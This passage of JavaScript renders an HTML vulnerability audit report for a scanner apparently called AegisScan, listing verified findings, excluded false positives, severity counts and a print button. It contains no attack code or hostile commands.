        <p style="font-size: 0.85rem; color: #94a3b8; font-family: var(--font-mono); margin-bottom: 0.5rem;">
          CVE: ${vuln.cve} | Target Host: ${vuln.host} | Status: ${vuln.verified ? 'VERIFIED' : 'UNVERIFIED'}
        </p>
        <p style="color: #cbd5e1; font-size: 0.9rem; margin-bottom: 0.5rem;">${vuln.description}</p>
        <h4 style="color: #94a3b8; font-size: 0.8rem; margin-top: 0.75rem; margin-bottom: 0.25rem;">REMEDIATION:</h4>
        <p style="color: #34d399; font-size: 0.9rem;">${vuln.remediation}</p>
      </div>
    `;
  });
  
  let fpListHtml = "";
  if (falsePositives.length > 0) {
    fpListHtml += `
      <h2 style="font-size: 1.5rem; border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem; margin-top: 3rem; margin-bottom: 1.5rem;">II. Excluded Findings (False Positives)</h2>
      <p style="color: #94a3b8; margin-bottom: 1.5rem;">The following findings were flagged by automated checks but verified manually as False Positives:</p>
    `;
    falsePositives.forEach(vuln => {
      fpListHtml += `
        <div style="margin-bottom: 1.5rem; border-left: 4px solid #64748b; padding-left: 1.25rem;">
          <h3 style="margin-bottom: 0.5rem; color: #94a3b8;">${vuln.title}</h3>
          <p style="font-size: 0.85rem; color: #64748b; font-family: var(--font-mono);">
            CVE: ${vuln.cve} | Target Host: ${vuln.host}
          </p>
        </div>
      `;
    });
  }
  
  reportContainer.innerHTML = `
    <div style="text-align: center; margin-bottom: 3rem;">
      <h1 style="font-size: 2.25rem; font-weight: 800; margin-bottom: 0.5rem;">AegisScan Vulnerability Audit Report</h1>
      <p style="color: #94a3b8; font-family: var(--font-mono);">Document Generated: ${date} | Target Segment: ${targetIpInput.value}</p>
    </div>
    
    <div class="glass-card" style="margin-bottom: 2.5rem; background: var(--bg-tertiary);">
      <h2 style="font-size: 1.25rem; margin-bottom: 1rem; color: #ffffff;">Executive Summary</h2>
      <p style="color: #cbd5e1; margin-bottom: 1rem;">
        An automated security assessment was performed across the targets segment. The assessment flagged a total of <strong>${scanResults.length}</strong> findings. After human analyst analysis, <strong>${falsePositives.length}</strong> findings were excluded as false positives, leaving <strong>${scanResults.length - falsePositives.length}</strong> verified vulnerabilities.
      </p>
      
      <table style="width: 100%; text-align: center; margin-top: 1.5rem;">
        <thead>
          <tr>
            <th style="text-align: center;">Critical</th>
            <th style="text-align: center;">High</th>
            <th style="text-align: center;">Medium</th>
            <th style="text-align: center;">Low</th>
            <th style="text-align: center;">Excluded (FP)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="color: var(--severity-critical); font-weight: bold; font-size: 1.5rem;">${criticalFindings.length}</td>
            <td style="color: var(--severity-high); font-weight: bold; font-size: 1.5rem;">${highFindings.length}</td>
            <td style="color: var(--severity-medium); font-weight: bold; font-size: 1.5rem;">${mediumFindings.length}</td>
            <td style="color: var(--severity-low); font-weight: bold; font-size: 1.5rem;">${lowFindings.length}</td>
            <td style="color: #64748b; font-weight: bold; font-size: 1.5rem;">${falsePositives.length}</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 style="font-size: 1.5rem; border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem; margin-bottom: 1.5rem;">I. Active & Verified Threats</h2>
    ${findingsListHtml}
    
    ${fpListHtml}
  `;
}

// Print Handler
btnPrintReport.addEventListener("click", () => {
  window.print();
});
